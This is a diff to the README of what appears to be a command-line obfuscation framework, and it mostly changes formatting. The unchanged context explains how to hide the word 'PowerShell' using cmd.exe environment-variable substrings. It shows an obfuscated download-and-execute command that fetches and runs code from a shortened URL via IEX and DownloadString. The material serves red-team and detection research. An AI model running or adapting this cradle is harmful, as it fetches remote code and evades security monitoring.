@@ -53,15 +53,15 @@ The framework provides 3 main obfuscation options:
 * PAYLOAD - Obfuscated payload via DOSfuscation
 
 ### BINARY
-One way to obfuscate the string PowerShell in the example command is to substitute individual characters with substrings of existing environment variable values. For example, executing the internal command ```set``` displays all environment variable name and value pairs.
-![bin_ex_1](https://ibb.co/d43Jh7H)
-The ```ALLUSERSPROFILE``` environment variable contains the character ```r``` at the 4th and 7th indexes. These single characters can be retrieved using cmd.exe’s native substring functionality: ```%ALLUSERSPROFILE:~4,1%``` or ```%ALLUSERSPROFILE:~7,1%```.
-![bin_ex_2](https://ibb.co/HHgR7y5)
+One way to obfuscate the string PowerShell in the example command is to substitute individual characters with substrings of existing environment variable values. For example, executing the internal command ```set``` displays all environment variable name and value pairs.<br>
+![bin ex 1](https://ibb.co/d43Jh7H)<br>
+The ```ALLUSERSPROFILE``` environment variable contains the character ```r``` at the 4th and 7th indexes. These single characters can be retrieved using cmd.exe’s native substring functionality: ```%ALLUSERSPROFILE:~4,1%``` or ```%ALLUSERSPROFILE:~7,1%```.<br>
+![bin ex 2](https://ibb.co/HHgR7y5)<br>
 Substituting the character ```r``` in PowerShell produces: ```Powe%ALLUSERSPROFILE:~4,1%Shell```. Adding this obfuscation back into the sample malicious command results in:
 ```CMD
 cmd.exe /c “Powe%ALLUSERSPROFILE:~4,1%Shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
 ```
-![bin_ex_3](https://ibb.co/WHmQM1b)
+![bin ex 3](https://ibb.co/WHmQM1b)
 
 ### ENCODING
 
